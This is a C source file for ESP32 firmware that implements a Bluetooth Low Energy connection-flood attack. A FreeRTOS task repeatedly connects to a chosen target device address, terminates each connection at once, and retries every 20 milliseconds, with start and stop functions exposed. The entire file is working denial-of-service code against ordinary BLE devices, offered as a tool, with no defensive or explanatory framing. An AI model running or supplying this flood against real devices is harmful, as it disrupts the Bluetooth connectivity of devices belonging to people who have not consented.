// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "ble_connect_flood.h"
#include "bluetooth_service.h"
#include "esp_log.h"
#include "esp_heap_caps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "host/ble_gap.h"
#include <string.h>

static const char *TAG = "BLE_FLOOD";

static bool is_running = false;
static uint8_t target_addr[6];
static uint8_t target_addr_type;

static TaskHandle_t flood_task_handle = NULL;
static StackType_t *flood_task_stack = NULL;
static StaticTask_t *flood_task_tcb = NULL;
#define FLOOD_STACK_SIZE 4096

static SemaphoreHandle_t flood_sem = NULL;

static int flood_gap_event(struct ble_gap_event *event, void *arg) {
  switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
      if (event->connect.status == 0) {
        ESP_LOGD(TAG, "Connected to target. Terminating...");
        ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
      } else {
        ESP_LOGW(TAG, "Connection failed status=%d", event->connect.status);
        if (flood_sem) xSemaphoreGive(flood_sem);
      }
      break;

    case BLE_GAP_EVENT_DISCONNECT:
      ESP_LOGD(TAG, "Disconnected.");
      if (flood_sem) xSemaphoreGive(flood_sem);
      break;

    default:
      break;
  }
  return 0;
}

static void flood_task(void *pvParameters) {
  ESP_LOGI(TAG, "Connection Flood Task Started");

  struct ble_gap_conn_params conn_params = {0};
  conn_params.scan_itvl = 0x0010;
  conn_params.scan_window = 0x0010;
  conn_params.itvl_min = BLE_GAP_INITIAL_CONN_ITVL_MIN;
  conn_params.itvl_max = BLE_GAP_INITIAL_CONN_ITVL_MAX;
  conn_params.latency = 0;
  conn_params.supervision_timeout = 0x0100;
  conn_params.min_ce_len = 0x0010;
  conn_params.max_ce_len = 0x0300;

  ble_addr_t addr;
  memcpy(addr.val, target_addr, 6);
  addr.type = target_addr_type;

  while (is_running) {
    bluetooth_service_stop_advertising();

    int rc = ble_gap_connect(bluetooth_service_get_own_addr_type(), &addr, 5000, &conn_params, flood_gap_event, NULL);

    if (rc == 0) {
      xSemaphoreTake(flood_sem, portMAX_DELAY);
    } else if (rc == BLE_HS_EALREADY) {
      vTaskDelay(pdMS_TO_TICKS(100));
    } else {
      ESP_LOGE(TAG, "Connect failed: %d", rc);
      vTaskDelay(pdMS_TO_TICKS(100));
    }

    // Minimal delay between attempts
    vTaskDelay(pdMS_TO_TICKS(20));
  }

  flood_task_handle = NULL;
  vTaskDelete(NULL);
}

esp_err_t ble_connect_flood_start(const uint8_t *addr, uint8_t addr_type) {
  if (is_running) {
    return ESP_ERR_INVALID_STATE;
  }

  if (!bluetooth_service_is_running()) {
    ESP_LOGE(TAG, "Bluetooth service not running");
    return ESP_FAIL;
  }

  memcpy(target_addr, addr, 6);
  target_addr_type = addr_type;

  if (flood_sem == NULL) {
    flood_sem = xSemaphoreCreateBinary();
  }

  xSemaphoreTake(flood_sem, 0);

  flood_task_stack = (StackType_t *)heap_caps_malloc(FLOOD_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  flood_task_tcb = (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_SPIRAM);

  if (!flood_task_stack || !flood_task_tcb) {
    ESP_LOGE(TAG, "Failed to allocate memory for flood task");
    if (flood_task_stack) heap_caps_free(flood_task_stack);
    if (flood_task_tcb) heap_caps_free(flood_task_tcb);
    return ESP_ERR_NO_MEM;
  }

  is_running = true;
  flood_task_handle = xTaskCreateStatic(
    flood_task,
    "ble_flood_task",
    FLOOD_STACK_SIZE,
    NULL,
    5,
    flood_task_stack,
    flood_task_tcb
  );

  if (flood_task_handle == NULL) {
    is_running = false;
    return ESP_FAIL;
  }

  return ESP_OK;
}

esp_err_t ble_connect_flood_stop(void) {
  if (!is_running) return ESP_OK;

  is_running = false;

  ble_gap_terminate(BLE_HS_CONN_HANDLE_NONE, BLE_ERR_REM_USER_CONN_TERM);

  if (flood_sem) {
    xSemaphoreGive(flood_sem); 
  }

  int retry = 20;
  while (flood_task_handle != NULL && retry > 0) {
    vTaskDelay(pdMS_TO_TICKS(50));
    retry--;
  }

  if (flood_task_stack) { heap_caps_free(flood_task_stack); flood_task_stack = NULL; }
  if (flood_task_tcb) { heap_caps_free(flood_task_tcb); flood_task_tcb = NULL; }

  if (flood_sem) {
    vSemaphoreDelete(flood_sem);
    flood_sem = NULL;
  }

  ESP_LOGI(TAG, "Flood stopped");
  return ESP_OK;
}

bool ble_connect_flood_is_running(void) {
  return is_running;
}
